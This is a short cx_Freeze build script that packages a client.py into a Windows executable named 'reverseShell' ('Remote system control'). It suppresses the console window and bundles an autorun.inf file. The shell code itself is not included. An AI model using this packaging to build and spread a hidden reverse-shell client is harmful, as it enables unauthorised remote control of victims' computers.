import sys
from cx_Freeze import setup, Executable

include_files = ['autorun.inf'] # Optional
base = None

if sys.platform == "win32": # Check if client is 32-bit windows
	base = "Win32GUI"

setup(name="reverseShell",
	version="0.1",
	description="Remote system control",
	options={'build_exe':{'include_files': include_files}},
	executables=[Executable("client.py", base=base)])
